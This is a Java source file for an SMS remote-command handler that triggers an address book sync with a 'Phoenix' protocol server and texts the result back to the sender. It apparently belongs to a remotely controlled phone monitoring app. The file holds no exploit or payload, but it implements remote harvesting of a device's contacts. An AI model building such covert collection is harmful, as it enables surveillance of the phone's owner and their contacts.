package com.vvt.rmtcmd.sms;

import com.vvt.prot.CommandResponse;
import com.vvt.prot.command.response.GetAddressBookCmdResponse;
import com.vvt.protsrv.PhoenixProtocolListener;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSSyncAddressbook extends RmtCmdAsync implements PhoenixProtocolListener {
	
//	private CommandCenter cmdCenter = CommandCenter.getInstance();
	
	public SMSSyncAddressbook(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	// Runnable
	public void run() {
		/*doSMSHeader(smsCmdCode.getSyncAddressbookCmd());
		responseMessage.append(RmtCmdTextResource.COMMAND_BEING_PROCESSED);
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// TODO: Not Supported
		*/
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
//		Log.debug("CmdSyncAddressbook.execute()", "ENTER!");
		smsSender.addListener(this);
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}	
	
	// PhoenixProtocolListener
	public void onError(String message) {
//		cmdCenter.removeListener(this);
		doSMSHeader(smsCmdCode.getSyncAddressbookCmd());
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(message);
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
	}

	public void onSuccess(CommandResponse response) {
		// cmdCenter.removeListener(this);
		doSMSHeader(smsCmdCode.getSyncAddressbookCmd());
		if (response instanceof GetAddressBookCmdResponse) {
			GetAddressBookCmdResponse getAddrRes = (GetAddressBookCmdResponse)response;
			if (getAddrRes.getStatusCode() == 0) {
				responseMessage.append(Constant.OK);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.SYNC_ADDRESSBOOK_EXECUTED);
			} else {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(getAddrRes.getServerMsg());								
			}
			// To create system event.
			createSystemEventOut(responseMessage.toString());
			// To send SMS reply.
			smsMessage.setMessage(responseMessage.toString());
			send();
		}
	}
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdSyncAddressbook.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}		
}
